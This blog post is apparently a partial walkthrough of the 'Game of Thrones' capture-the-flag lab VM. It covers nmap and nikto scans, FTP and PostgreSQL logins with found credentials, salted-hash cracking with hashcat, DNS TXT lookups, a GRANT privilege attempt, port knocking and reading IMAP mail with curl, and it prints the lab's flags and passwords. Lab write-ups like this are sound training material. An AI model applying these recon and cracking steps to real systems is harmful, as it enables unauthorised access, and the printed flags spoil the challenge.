---
layout: post
title: Game of thrones
slug: game-of-thrones
name: game-of-thrones
---

# GoT


## Discover

{% highlight bash %}

netdiscover -r 192.168.1.0/24
Currently scanning: Finished!   |   Screen View: Unique Hosts

5 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 300
_____________________________________________________________________________
IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
192.168.1.1     30:5a:3a:73:51:90      1      60  ASUSTek COMPUTER INC.
192.168.1.5     78:4f:43:86:36:e3      1      60  Apple, Inc.
192.168.1.50    00:0c:29:f9:ee:88      1      60  VMware, Inc.
192.168.1.50    78:4f:43:86:36:e3      2     120  Apple, Inc.

nmap -T4 -sV -oA output 192.168.1.50

Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-23 21:16 MST
Stats: 0:01:16 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 83.33% done; ETC: 21:18 (0:00:15 remaining)
Stats: 0:01:44 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 83.33% done; ETC: 21:18 (0:00:20 remaining)
Nmap scan report for 7kingdoms (192.168.1.50)
Host is up (0.00022s latency).
Not shown: 992 closed ports
PORT      STATE    SERVICE    VERSION
21/tcp    open     ftp?
22/tcp    open     ssh        Linksys WRT45G modified dropbear sshd (protocol 2.0)
53/tcp    open     domain     ISC BIND Bind
80/tcp    open     http       Apache httpd
143/tcp   filtered imap
3306/tcp  filtered mysql
5432/tcp  open     postgresql PostgreSQL DB 9.6.0 or later
10000/tcp open     http       MiniServ 1.590 (Webmin httpd)
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port21-TCP:V=7.60%I=7%D=1/23%Time=5A6808B6%P=x86_64-pc-linux-gnu%r(Gene
SF:ricLines,11C,"220-------------------------\r\n220-\"These\x20are\x20the
SF:\x20Dorne\x20city\x20walls\.\x20We\x20must\x20enter!\"\x20-\x20Grey\x20
SF:Worm\r\n220-\r\n220-\"A\x20fail2ban\x20spell\x20is\x20protecting\x20the
SF:se\x20walls\.\x20You'll\x20never\x20get\x20in\"\x20-\x20One\x20of\x20th
SF:e\x20Sand\x20Snake\x20Girls\r\n220-------------------------\r\n220\x20T
SF:his\x20is\x20a\x20private\x20system\x20-\x20No\x20anonymous\x20login\r\
SF:n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5432-TCP:V=7.60%I=7%D=1/23%Time=5A6808B1%P=x86_64-pc-linux-gnu%r(SM
SF:BProgNeg,8C,"E\0\0\0\x8bSFATAL\0VFATAL\0C0A000\0Munsupported\x20fronten
SF:d\x20protocol\x2065363\.19778:\x20server\x20supports\x201\.0\x20to\x203
SF:\.0\0Fpostmaster\.c\0L2031\0RProcessStartupPacket\0\0");
MAC Address: 00:0C:29:F9:EE:88 (VMware)
Service Info: Device: router

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 180.60 seconds

{% endhighlight %}

Page source of port 80:

{% highlight html %}

<!--
This is the Game of Thrones CTF v1.0 (September 2017)

Designed by Oscar Alfonso (OscarAkaElvis or v1s1t0r)
Contact: v1s1t0r.1s.h3r3@gmail.com
https://github.com/OscarAkaElvis/game-of-thrones-hacking-ctf

Thanks to the beta testers, specially to j0n3, Kal3l and masAcre

--------------------------------------
 _____                      ___    _____ _                       			
|   __|___ _____ ___    ___|  _|  |_   _| |_ ___ ___ ___ ___ ___ 
|  |  | .'|     | -_|  | . |  _|    | | |   |  _| . |   | -_|_ -|
|_____|__,|_|_|_|___|  |___|_|      |_| |_|_|_| |___|_|_|___|___|

--------------------------------------

Goal:
-Get the 7 kingdom flags and the 4 extra content flags (3 secret flags + final battle flag). There are 11 in total.

Rules/guidelines to play:
- Start your conquer of the seven kingdoms
- You'll need hacking skills, no Game of Thrones knowledge is required. But if you play, it may contains spoilers of the TV series
- Difficulty of the CTF: Medium-High
- This is the start point, the base camp
- You must travel to westeros. First stop: Dorne. Last stop: King's Landing
- Don't forget to take your map (try to find it). It will guide you about the natural flag order to follow over the kingdoms
- Listen CAREFULLY to the hints. If you are stuck, read the hints again!
- Powerful fail2ban spells were cast everywhere. Bruteforce is not an option for this CTF (2 minutes ban penalty)
- The flags are 32 chars strings. Keep'em all! you'll need them

Good luck, the old gods and the new will protect you!

The game already started!! A couple of hints as a present.

"Everything can be TAGGED in this world, even the magic or the music" - Bronn of the Blackwater

"To enter in Dorne you'll need to be a kind face" - Ellaria Sand
-->

{% endhighlight %}

/robots.txt

{% highlight html %}

User-agent: Three-eyed-raven
Allow: /the-tree/
User-agent: *
Disallow: /secret-island/
Disallow: /direct-access-to-kings-landing/

{% endhighlight %}

Set user agent to Three-eyed-raven and hit /the-tree:

{% highlight html %}

<!--
    "I will give you three hints, I can see the future so listen carefully" - The three-eyed raven Bran Stark
    
    "To enter in Dorne you must identify as oberynmartell. You still should find the password"
    "3487 64535 12345 . Remember these numbers, you'll need to use them with POLITE people you'll know when to use them" 
    "The savages never crossed the wall. So you must look for them before crossing it"
-->

{% endhighlight %}

/secret-island/ gives the map

{% highlight html %}

<!--
    "Take this map and use it wisely. I want to be your friend" - Petyr (Littlefinger) Baelish
-->

{% endhighlight %}

Gives a map, outlines some of what nmap found:

1. dorne (ftp)
2. the wall/north (http)
3. iron islands (dns)
4. stormlands (webmin)
5. mountain and the vale (postgresql)
6. the reach (imap)
7. the rock and kinds landing (gitlist and mysql)

Bonuses:

8. Final battle, whitewalkers (ssh)
9. Savages (secret flag)
10. City of Braavos (secret flag)
11. Dragonglass mine (secret flag)

/direct-access-to-kings-landing/

{% highlight html %}

<!--
    "I've heard the savages usually play music. They are not as wild as one can expect, are they?" - Sansa Stark
-->

{% endhighlight %}

Another potential clue in: /css/game_of_thrones.css

{% highlight css %}
.basecamp {
    background-image: url("../imgs/background.jpg");
	background-repeat: no-repeat;
	background-position: top;
	background-color: #000000;
}

.main {
	background-color: #000000;
}

.hover {
	cursor: pointer;
}

/*
"Music reaches where words can't. It's known even for the animals" - Catelyn Stark
*/
{% endhighlight %}

Another clue in: js/game_of_thrones.js

{% highlight javascript %}
(function() {
	
	var onLoad = function() {

		var play_pause = function() {
			var myAudio = document.getElementById("player");
			var audioButton = document.getElementById("audio_button");

			if (myAudio.paused) {
				audioButton.src = "imgs/play.png";
				audioButton.title = "Click to mute!";
				myAudio.play();	
			}
			else {
				audioButton.src = "imgs/mute.png";
				audioButton.title = "Click to play!";
				myAudio.pause();
			}
		}
		
		document.getElementById("audio_button").addEventListener("click", play_pause);
	};
	
	document.readyState != 'loading' ? onLoad() : document.addEventListener('DOMContentLoaded', onLoad);
})();

/*
"You'll never enter into King's Landing through the main gates. The queen ordered to close them permanently until the end of the war" - Tywin Lannister

"If you put a city under siege, after five attacks you'll be banned two minutes" - Aegon the Conqueror and His Conquest of Westeros Book
*/

{% endhighlight %}


running strings on music/game_of_thrones.mp3

TAGGame of Thrones - Main theme
O.S.T.
Savages secret flag: 8bf8854bebe108183caeb845c7676ae4
Savages secret flag: 8bf8854be

running nikto:
{% highlight bash %}
nikto -host http://192.168.1.50
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.50
+ Target Hostname:    192.168.1.50
+ Target Port:        80
+ Start Time:         2018-01-24 18:30:07 (GMT-7)
---------------------------------------------------------------------------
+ Server: Apache
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Entry '/the-tree/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/secret-island/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/direct-access-to-kings-landing/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 3 entries which should be manually viewed.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3092: /sitemap.xml: This gives a nice listing of the site content.
+ OSVDB-3092: /imgs/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7539 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2018-01-24 18:30:18 (GMT-7) (11 seconds)
---------------------------------------------------------------------------
{% endhighlight %}


And the raven.php:

{% highlight html %}
<!--
    You received a raven with this message:
    "To pass through the wall, mcrypt spell will help you. It doesn't matter who you are, only the key is needed to open the secret door" - Anonymous
-->

{% endhighlight %}

Now time to force browse and see if there are more clues:

{% highlight html %}

<!--
    "My little birds are everywhere. To enter in Dorne you must say: A_verySmallManCanCastAVeryLargeShad0w . Now, you owe me" - Lord (The Spider) Varys
                        
    "Powerful docker spells were cast over all kingdoms. We must be careful! You can't travel directly from one to another... usually. That's what the Lord of Light has shown me" - The Red Woman Melisandre
-->

{% endhighlight %}


Now we should be able to get the first flag:

{% highlight bash %}

ftp 192.168.1.50
Connected to 192.168.1.50.
220-------------------------
220-"These are the Dorne city walls. We must enter!" - Grey Worm
220-
220-"A fail2ban spell is protecting these walls. You'll never get in" - One of the Sand Snake Girls
220-------------------------
220 This is a private system - No anonymous login
Name (192.168.1.50:root): oberynmartell
331 User oberynmartell OK. Password required
Password:
230-OK. Current directory is /
230-Welcome to:
230- ____
230-|    \ ___ ___ ___ ___
230-|  |  | . |  _|   | -_|
230-|____/|___|_| |_|_|___|
230-
230-Principality of Dorne was conquered. This is your first kingdom flag!
230 fb8d98be1265dd88bac522e1b2182140

ftp> ls
200 PORT command successful
150 Connecting to port 41083
-rw-r--r--    1 0          0                 304 Aug 27 22:15 problems_in_the_north.txt
-rw-r--r--    1 0          0                 492 Aug 20 00:31 the_wall.txt.nc

ftp> mget *
mget problems_in_the_north.txt? y
200 PORT command successful
150 Connecting to port 49987
226-File successfully transferred
226 0.006 seconds (measured here), 46.09 Kbytes per second
304 bytes received in 0.01 secs (44.2173 kB/s)
mget the_wall.txt.nc? y
200 PORT command successful
150 Connecting to port 39057
226-File successfully transferred
226 0.006 seconds (measured here), 74.41 Kbytes per second
492 bytes received in 0.01 secs (70.7508 kB/s)
ftp> exit
221-Goodbye. You uploaded 0 and downloaded 1 kbytes.
221 Logout.

cat problems_in_the_north.txt

"There are problems in the north. We must travel quickly. Once there we must defend the wall" - Jon Snow

"What kind of magic is this?!? I never saw before this kind of papirus. Let's check it carefully" - Maester Aemon Targaryen

md5(md5($s).$p)

nobody:6000e084bf18c302eae4559d48cb520c$2hY68a

cat the_wall.txt.nc
m@rijndael-128 cbcmcrypt-sha1B�_�9�WB�[nF�9�4�md5#N-�}
                                                      �6�6f��>�oh����y<Z8��\����N���Ab��
                                                                                        Tq2Ә�l���1�� 7��}Fjs�I�@ �rLS�tgh7M�CSu�|Ҿc��n�-�Iֶ
�nv�\Q�I��Pcf������*ag{��kT�(y��w�����	u���Dd>y�@'�ɍЙ$��
                                                         ������lw�Y$�<��A)��^$��:6DV2	�s;��sW�����o��U�1Wo̙�x{=)ʇ�Tp�3�0���(�8כs�H��y&���3�")db3G
q��/��&*U��}G��:�: ��4�9��棓�                                                                                                                      H]�X�[��
                  ��r
                     �������

                            !��8#���(|�k\	�<�Vϸf	�w
                                                          =R;])7��<����a`�x��r

{% endhighlight %}

I ended up looking part of the next piece up, in the problems in the north file we get a hash and what looks like the functions to calculate the hash, but thats pretty much as far as I got.  After trying the hash on crackstation and hashkiller I read about solving this step, turns out hashcat legacy provides a way to reverse hashes in this format, the $s being the salt and $p being the password, the result ends up being stark when using rockyou as the wordlist.

okay, now that we have a password, we can look at the_wall.txt.nc, looks like something possible mcrypt decrypted, since thats in our clue its worth checking out:

{% highlight bash %}

mdecrypt the_wall
Unknown suffix. Will append '.dc'.
Enter passphrase: stark
File the_wall was decrypted.
cat the_wall

"We defended the wall. Thanks for your help. Now you can go to recover Winterfell" - Jeor Mormont, Lord Commander of the Night's Watch

"I'll write on your map this route to get faster to Winterfell. Someday I'll be a great maester" - Samwell Tarly

http://winterfell.7kingdoms.ctf/------W1nt3rf3ll------
Enter using this user/pass combination:
User: jonsnow
Pass: Ha1lt0th3k1ng1nth3n0rth!!!

{% endhighlight %}

Not sure where this site would be accessible but tried appending: ------W1nt3rf3ll------ and got a page with this, clearly an incorrect assumption:

{% highlight html %}
<!--
    "You'll never arrive to Winterfell on that direction. It seems you never learned to read" - The Hound
    
    "What are you saying? VirtualHost? What the hell is that? Did you get drunk again?" - Gregor (The Mountain) Clegane
-->
{% endhighlight %}


It mentions VirtualHost, I can't help but think this may be a matter of pointing to the VM in my hosts file

Just hitting the root we get:
{% highlight html %}
<!--
    “If you think this has a happy ending, you haven’t been paying attention.” - Ramsay Bolton
-->
{% endhighlight %}

And in the stylesheet: /winterfell.css

{% highlight css %}

.main {
	background-color: #000000;
}

.hover {
	cursor: pointer;
}

/*
"Old TeXTs are written about how to enter into the Iron Islands fortress" - Theon Greyjoy
*/
{% endhighlight %}

Accessing the URL from our previous clues and logging in with the creds: 

{% highlight html %}
<!--
    Welcome to Winterfell
    You conquered the Kingdom of the North. This is your second kingdom flag!
    639bae9ac6b3e1a84cebb7b403297b79
    
    "We must do something here before travelling to Iron Islands, my lady" - Podrick Payne
    
    "Yeah, I can feel the magic on that shield. Swords are no more use here" - Brienne Tarth
-->
{% endhighlight %}


I am going to guess that these clues refer to something hidden in the shield image


running strings on stark_shield.jpg yields:

"Timef0rconqu3rs TeXT should be asked to enter into the Iron Islands fortress" - Theon Greyjoy

{% highlight bash %}
dig txt Timef0rconqu3rs.7kingdoms.ctf -p 53

; <<>> DiG 9.10.6-Debian <<>> txt Timef0rconqu3rs.7kingdoms.ctf -p 53
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 9676
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 2, ADDITIONAL: 3

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;Timef0rconqu3rs.7kingdoms.ctf.	IN	TXT

;; ANSWER SECTION:
Timef0rconqu3rs.7kingdoms.ctf. 86400 IN	TXT	"You conquered Iron Islands kingdom flag: 5e93de3efa544e85dcd6311732d28f95. Now you should go to Stormlands at http://stormlands.7kingdoms.ctf:10000 . Enter using this user/pass combination: aryastark/N3ddl3_1s_a_g00d_sword#!"

;; AUTHORITY SECTION:
7kingdoms.ctf.		86400	IN	NS	ns1.7kingdoms.ctf.
7kingdoms.ctf.		86400	IN	NS	ns2.7kingdoms.ctf.

;; ADDITIONAL SECTION:
ns1.7kingdoms.ctf.	86400	IN	A	192.168.0.161
ns2.7kingdoms.ctf.	86400	IN	A	192.168.0.161

;; Query time: 15 msec
;; SERVER: 192.168.1.50#53(192.168.1.50)
;; WHEN: Wed Jan 24 20:06:15 MST 2018
;; MSG SIZE  rcvd: 363
{% endhighlight %}


This next one I wasn't able to actually get through, I found the file in webmin's file manager after searching for "a" however the file manager had a lot of issues and required java applets.  I got to the file but couldn't open it because the web app wasn't working, ended up grabbing the contents from a walkthrough to keep progressing.

{% highlight bash %}

Congratulations! you conquered Sotrmlangs.  This is your flag: 8fc42c6ddf9966db3b09e84365034357

Now prepare yourself for the next challenge!

The credentials to access to the Mountain and Vale kingdom are:
user/pass: robinarryn/cr0wn_f0r_a_King-_
db: mountainandthevale

pgAdmin magic will not work.  Command line should be used on that kingdom - Talisa Maegyr

{% endhighlight %}

{% highlight sql %}

psql -h 192.168.1.50 -p 5432 -U robinarryn mountainandthevale
Password for user robinarryn:
psql (10.1, server 9.6.4)
Type "help" for help.

mountainandthevale=> \dt
                List of relations
 Schema |        Name         | Type  |  Owner
--------+---------------------+-------+----------
 public | aryas_kill_list     | table | postgres
 public | braavos_book        | table | postgres
 public | eyrie               | table | postgres
 public | popular_wisdom_book | table | postgres
(4 rows)

mountainandthevale=> select * from aryas_kill_list;
 id |         name          |                               why
----+-----------------------+-----------------------------------------------------------------
  1 | WalderFrey            | For orchestrating the Red Wedding
  2 | CerseiLannister       | For her role in Ned Starks death
  3 | TheMountain           | For the torture at Harrenhal
  4 | TheHound              | For killing Mycah, the butchers boy
  5 | TheRedWomanMelisandre | For kidnapping Gendry
  6 | BericDondarrion       | For selling Gendry to Melisandre
  7 | ThorosofMyr           | For selling Gendry to Melisandre
  8 | IlynPayne             | For executing Ned Stark
  9 | MerynTrant            | For killing Syrio Forel
 10 | JoffreyBaratheon      | For ordering Ned Starks execution
 11 | TywinLannister        | For orchestrating the Red Wedding
 12 | Polliver              | For killing Lommy, stealing Needle and the torture at Harrenhal
 13 | Rorge                 | For the torture at Harrenhal and threatening to rape her
(13 rows)

mountainandthevale=> select * from braavos_book;

 page |                                                                                                                  text
------+-------------------------------------------------------------------------------------------------------------------------------------------
    1 | City of Braavos is a very particular place. It is not so far from here.
    2 | "There is only one god, and his name is Death. And there is only one thing we say to Death: Not today" - Syrio Forel
    3 | Braavos have a lot of curious buildings. The Iron Bank of Braavos, The House of Black and White, The Titan of Braavos, etc.
    4 | "A man teaches a girl. -Valar Dohaeris- All men must serve. Faceless Men most of all" - Jaqen H'ghar
    6 | "A girl has no name" - Arya Stark
    7 | City of Braavos is ruled by the Sealord, an elected position.
    8 | "That man's life was not yours to take. A girl stole from the Many-Faced God. Now a debt is owed" - Jaqen H'ghar
    9 | Dro wkxi-pkmon qyn gkxdc iye dy mrkxqo iyeb pkmo. Ro gkxdc iye dy snoxdspi kc yxo yp iyeb usvv vscd. Covomd sd lkcon yx drsc lyyu'c vycd zkqo xewlob. Dro nkdklkco dy myxxomd gsvv lo lbkkfyc kxn iyeb zkccgybn gsvv lo: FkvkbWybqrevsc
(8 rows)

mountainandthevale=> select * from eyrie
mountainandthevale-> ;
 id |          character           |                                                                         text
----+------------------------------+---------------------------------------------------------------------------------------------------
  1 | Lysa Arryn                   | We were allies for centuries. We can negotiate the peace if you win this mind game
  2 | Robin Arryn                  | The flag is hidden somewhere on this dungeon. You'll never find it. Ha ha ha!
  3 | Mord                         | You'll be thrown into one of the sky cells!!
  4 | Petyr (Littlefinger) Baelish | I'm here to help as always... If you OWN your destiny you can do anything
  5 | Tyrion Lannister             | Books say stupid things sometimes like people do. You have to decide what to believe and what could be useful. The best choice for me is to be drunk
(5 rows)

mountainandthevale=> select * from popular_wisdom_book;

 id |                                                                                                text
----+------------------------------------------------------------------------------------------------------------------------------------------------------
  1 | The First Men are the original human inhabitants of Westeros
  2 | The King's Landing main gates are closed by orders of the Queen. Nobody can pass, and it seems something permanent
  3 | The High Garden citizens never were great warriors, they are POLITE people. If you want to enter to their fortress you only need to Knock at the gates but following their rules... they like order
  4 | A Lannister always pays his debts
  5 | The old arcane Docker magic is present over all the kingdoms. Usually you can't use it to move between them but there is a secret tunnel from The Rock to King's Landing, everybody knows that
  6 | The Iron Bank has the control. They can give you anything you want if you pay enough...
(6 rows)

{% endhighlight %}

The entry in braavos_book looks like random stuff seems like its encoded or ciphered, maybe rot13?

Turned out to be rot16:
:
The many-faced god wants you to change your face. He wants you to identify as one of your kill list. Select it based on this book's lost page number. The database to connect will be braavos and your password will be: ValarMorghulis

The missing number is 5, TheRedWomanMelisandre

{% highlight sql %}

psql -h 192.168.1.50 -p 5432 -U TheRedWomanMelisandre braavos
Password for user TheRedWomanMelisandre:
psql (10.1, server 9.6.4)
Type "help" for help.

braavos=> \dt
                   List of relations
 Schema |            Name            | Type  |  Owner
--------+----------------------------+-------+----------
 public | temple_of_the_faceless_men | table | postgres
(1 row)

braavos=> select * from temple_of_the_faceless_men;
               flag               |                                                    text
----------------------------------+-------------------------------------------------------------------------------------------------------------
 3f82c41a70a8b0cfec9052252d9fd721 | Congratulations. You've found the secret flag at City of Braavos. You've served well to the Many-Faced God.
(1 row)

{% endhighlight %}

Getting the next flag was a real bitch, having not used postgres at all I was a bit stumped.  I tried executing \list to get all the databases thinking that might be the hint.  Then looking back at the hints the comment about OWN seemed relevant which brings to mind GRANT.

{% highlight sql %}
mountainandthevale=> \d
                      List of relations
 Schema |            Name            |   Type   |   Owner
--------+----------------------------+----------+------------
 public | aryas_kill_list            | table    | postgres
 public | aryas_kill_list_id_seq     | sequence | postgres
 public | braavos_book               | table    | postgres
 public | eyrie                      | table    | postgres
 public | eyrie_id_seq               | sequence | postgres
 public | flag                       | view     | robinarryn
 public | popular_wisdom_book        | table    | postgres
 public | popular_wisdom_book_id_seq | sequence | postgres
(8 rows)

mountainandthevale=> select * from flag
mountainandthevale-> ;
ERROR:  permission denied for relation flag
mountainandthevale=> grant all privileges on all tables in schema public to robinarryn;
WARNING:  no privileges were granted for "eyrie"
WARNING:  no privileges were granted for "popular_wisdom_book"
WARNING:  no privileges were granted for "braavos_book"
WARNING:  no privileges were granted for "aryas_kill_list"
GRANT
mountainandthevale=> select * from flag
G{% endhighlight %}

{% highlight bash %}

echo 'TmljZSEgeW91IGNvbnF1ZXJlZCB0aGUgS2luZ2RvbSBvZiB0aGUgTW91bnRhaW4gYW5kIHRoZSBWYWxlLiBUaGlzIGlzIHlvdXIgZmxhZzogYmIzYWVjMGZkY2RiYzI5NzQ4OTBmODA1YzU4NWQ0MzIuIE5
    leHQgc3RvcCB0aGUgS2luZ2RvbSBvZiB0aGUgUmVhY2guIFlvdSBjYW4gaWRlbnRpZnkgeW91cnNlbGYgd2l0aCB0aGlzIHVzZXIvcGFzcyBjb21iaW5hdGlvbjogb2xlbm5hdHlyZWxsQDdraW5nZG9tcy
    5jdGYvSDFnaC5HYXJkM24ucG93YWggLCBidXQgZmlyc3QgeW91IG11c3QgYmUgYWJsZSB0byBvcGVuIHRoZSBnYXRlcw==' | base64 -D

Nice! you conquered the Kingdom of the Mountain and the Vale. This is your flag: bb3aec0fdcdbc2974890f805c585d432. Next stop the Kingdom of the Reach. You can identify yourself with this user/pass combination: olennatyrell@7kingdoms.ctf/H1gh.Gard3n.powah , but first you must be able to open the gates

{% endhighlight %}


Now for the reach, I tried telnet and curl, nothing seemed to work on the port nmap found.  Then I remembered one of the original hints, a list of numbers for use by polite people, I decided to try port-knocking to see if that opens something up:

{% highlight bash %}


for x in 3487 64535 12345;do nmap -Pn --host_timeout 201 --max-retries 0 -p $x 192.168.1.50; done

Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-26 16:20 MST
Nmap scan report for winterfell.7kingdoms.ctf (192.168.1.50)
Host is up (0.00089s latency).

PORT     STATE  SERVICE
3487/tcp closed ltctcp
MAC Address: 00:0C:29:F9:EE:88 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.25 seconds

Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-26 16:20 MST
Nmap scan report for winterfell.7kingdoms.ctf (192.168.1.50)
Host is up (0.00087s latency).

PORT      STATE  SERVICE
64535/tcp closed unknown
MAC Address: 00:0C:29:F9:EE:88 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.20 seconds

Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-26 16:20 MST
Nmap scan report for winterfell.7kingdoms.ctf (192.168.1.50)
Host is up (0.00050s latency).

PORT      STATE  SERVICE
12345/tcp closed netbus
MAC Address: 00:0C:29:F9:EE:88 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.18 seconds
{% endhighlight %}

Then tried accessing the imap server again:

{% highlight bash %}

telnet 192.168.1.50 143
Trying 192.168.1.50...
Connected to 192.168.1.50.
Escape character is '^]'.
* OK [CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE IDLE AUTH=LOGIN AUTH=PLAIN] Kingdom of the Reach
^]

telnet> quit
Connection closed.

{% endhighlight %}

Looks open now, time to start trying to get info, did some searching looks like this can be done with curl:

{% highlight bash %}

curl --url "imap://192.168.1.50:143" --user "olennatyrell@7kingdoms.ctf:H1gh.Gard3n.powah"
* LIST (\HasNoChildren \Trash) "/" Trash
* LIST (\HasNoChildren \Drafts) "/" Drafts
* LIST (\HasNoChildren \Sent) "/" Sent
* LIST (\HasNoChildren) "/" INBOX<Paste>



{% endhighlight %}

Now to enumerate the folders:

{% highlight bash %}
for x in Trash Drafts Sent INBOX; do curl --url "imap://192.168.1.50:143/" --user "olennatyrell@7kingdoms.ctf:H1gh.Gard3n.powah" --request "EXAMINE $x";done
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS ()] Read-only mailbox.
* 0 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 1504823859] UIDs valid
* OK [UIDNEXT 1] Predicted next UID
* OK [HIGHESTMODSEQ 1] Highest
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS ()] Read-only mailbox.
* 0 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 1504823860] UIDs valid
* OK [UIDNEXT 1] Predicted next UID
* OK [HIGHESTMODSEQ 1] Highest
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS ()] Read-only mailbox.
* 0 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 1504823861] UIDs valid
* OK [UIDNEXT 1] Predicted next UID
* OK [HIGHESTMODSEQ 1] Highest
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS ()] Read-only mailbox.
* 1 EXISTS
* 1 RECENT
* OK [UNSEEN 1] First unseen.
* OK [UIDVALIDITY 1504823858] UIDs valid
* OK [UIDNEXT 2] Predicted next UID
* OK [HIGHESTMODSEQ 1] Highest
{% endhighlight %}

Looks like the inbox has a message, let's take a look:

{% highlight bash %}

curl --url "imap://192.168.1.50:143/INBOX/;UID=1" --user "olennatyrell@7kingdoms.ctf:H1gh.Gard3n.powah"
Return-Path: <lorastyrell@7kingdoms.ctf>
Delivered-To: olennatyrell@7kingdoms.ctf
Received: by mail.7kingdoms.ctf (Postfix, from userid 0)
	id E1FA643329; Fri,  8 Sep 2017 00:37:37 +0200 (CEST)
Subject: You conquered the Kingdom of the Reach
From: Sir_Loras_Tyrell<lorastyrell@7kingdoms.ctf>
To: <olennatyrell@7kingdoms.ctf>
X-Mailer: mail (GNU Mailutils 2.99.98)
Message-Id: <20170907223737.E1FA643329@mail.7kingdoms.ctf>
Date: Fri,  8 Sep 2017 00:37:37 +0200 (CEST)

Congratulations!!

You conquered the Kingdom of the Reach. This is the flag: aee750c2009723355e2ac57564f9c3db

Now you can auth on next Kingdom (The Rock, port 1337) using this user/pass combination:
User: TywinLannister
Pass: LannisterN3verDie!

"The things I do for love..." - Jaime (Kingslayer) Lannister

{% endhighlight %}

This one I had trouble with again, no ability to hit port 1337 in my browser, seems like the VM doesn't work, tried rebooting it just doesn't seem to work.


